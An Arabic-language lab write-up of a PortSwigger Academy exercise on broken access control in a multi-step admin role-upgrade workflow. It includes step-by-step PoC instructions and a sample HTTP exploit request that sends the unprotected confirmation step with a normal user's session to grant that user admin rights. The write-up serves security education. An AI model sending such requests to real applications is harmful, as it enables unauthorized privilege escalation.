# Lab 12 — Multi-step Process with No Access Control on One Step (تخطي الصلاحيات في المعالجات متعددة الخطوات)

[![التصنيف](https://img.shields.io/badge/الفئة-Broken%20Access%20Control-red)]()
[![النوع](https://img.shields.io/badge/النوع-Vertical%20Broken%20Access%20Control%20(Workflow%20Bypass)-orange)]()
[![مستوى الخطورة](https://img.shields.io/badge/الخطورة-حرج%20(Critical)-critical)]()
[![المصدر](https://img.shields.io/badge/المصدر-PortSwigger%20Academy-blue)](https://portswigger.net/web-security/access-control)

> هذا الشرح جزء من سلسلة [معامل التحكم في الوصول (BAC)](./README.md) — أكاديمية PortSwigger.

---

## 1. بطاقة تعريف اللاب (Overview)

| الحقل | التفاصيل |
|---|---|
| **اسم اللاب** | Lab 12 — Multi-step Process with No Access Control on One Step (تخطي الصلاحيات في المعالجات متعددة الخطوات) |
| **تصنيف الثغرة** | Vertical Broken Access Control (Workflow Bypass) |
| **معيار الضعف (CWE)** | CWE-841: Improper Enforcement of Behavioral Workflow |
| **مستوى الخطورة** | حرج (Critical) |
| **الهدف من اللاب** | ترقية حساب wiener إلى رتبة أدمن بالقفز مباشرة إلى خطوة التأكيد غير المحمية. |

---

## 2. فكرة اللاب وسيناريو المشكلة (Concept & Vulnerability Mechanism)

تتم ترقية المستخدمين في هذا التطبيق على خطوتين:
1. **الخطوة الأولى:** يختار الأدمن اسم المستخدم ويضغط ترقية (`POST /admin-roles` مع `action=upgrade`). يتحقق السيرفر في هذه الخطوة من أن المستخدم أدمن، ثم يعرض شاشة تأكيد: "هل أنت متأكد من الترقية؟".
2. **الخطوة الثانية:** عند الضغط على تأكيد (Confirm)، يرسل المتصفح طلباً آخر: `POST /admin-roles` مع `action=upgrade&confirmed=true`.

**الخلل الفكري هنا:** افترض المطور أن المستخدم لن يصل للخطوة الثانية أبداً إلا إذا كان قد اجتاز الخطوة الأولى بنجاح! ولذلك، لم يضع فحص صلاحيات الأدمن داخل معالج الخطوة الثانية. يستطيع المستخدم العادي تجاوز الخطوة الأولى بالكامل، وإرسال طلب الخطوة الثانية مباشرة وترقية نفسه!

---

## 3. التحليل الجذري للسبب (Root Cause Analysis)

### 🔴 وجهة نظر المهاجم (Attacker Perspective):
المهاجم يحلل تدفق العمليات متعددة الخطوات، ويكتشف أن خطوة التأكيد النهائية لا تتحقق من الصلاحيات، فيرسلها مباشرة بجلسة حسابه العادي.

### 🟢 وجهة نظر المدافع والمطور (Defender Perspective):
الافتراض الخاطئ بأن تدفق واجهة المستخدم يضمن التسلسل المنطقي في الباك إند. بروتوكول HTTP لا يحتفظ بالحالة (Stateless)، وأي Endpoint يمكن استدعاؤه منفرداً.

---

## 4. خطوات الاستغلال والحل بالتفصيل (Proof of Concept - PoC)

1. سجل دخولك بحساب `administrator:admin`، وتوجه للوحة الإدارة.
2. ابدأ ترقية مستخدم وشاهد تدفق الطلبات في Burp Suite HTTP History.
3. ستلاحظ وجود طلبين:
1. الطلب الأول المبدئي: `POST /admin-roles` مع `action=upgrade&username=carlos`
2. طلب التأكيد النهائي: `POST /admin-roles` مع `action=upgrade&confirmed=true&username=carlos`
4. أرسل طلب التأكيد النهائي إلى **Burp Repeater**.
5. قم بتغيير اسم المستخدم المستهدف إلى `wiener`، واستبدل كوكي الجلسة بكوكي المستخدم العادي `wiener`.
6. اضغط Send، ستجد أن السيرفر نفذ الطلب ورد بـ `302 Found` وتمت ترقية wiener لأدمن!

---

## 5. أدلة الترافيك (Evidence: Request / Response)

### نموذج طلب الاستغلال (Exploit Request):
```http
POST /admin-roles HTTP/1.1
Host: <lab-id>.web-security-academy.net
Cookie: session=wiener_session
Content-Type: application/x-www-form-urlencoded

action=upgrade&confirmed=true&username=wiener
```

### نموذج استجابة السيرفر (Server Response):
```http
HTTP/1.1 302 Found
Location: /
...
```

---

## 6. الأثر الواقعي للثغرة (Impact)

اختراق كامل لنموذج الصلاحيات وترقية الحسابات بتخطي خطوات الفحص الأولى للعملية.

---

## 7. الحماية والإغلاق البرمجي (Remediation)

يجب فحص هوية ورتبة المستخدم في كل خطوة ومرحلة من مراحل المعالج، وعدم افتراض أن اجتياز خطوة سابقة يمنح حصانة في الخطوات اللاحقة.

---

## 8. المراجع الرسمية (References)

- [PortSwigger Web Security Academy — Access Control](https://portswigger.net/web-security/access-control)
- [OWASP Top 10 — A01:2021 Broken Access Control](https://owasp.org/Top10/A01_2021-Broken_Access_Control/)
- [CWE Database Details](https://cwe.mitre.org/)

---
*تم إعداد هذا التوثيق للأغراض التعليمية واختبار الاختراق الأخلاقي المصرح به.*
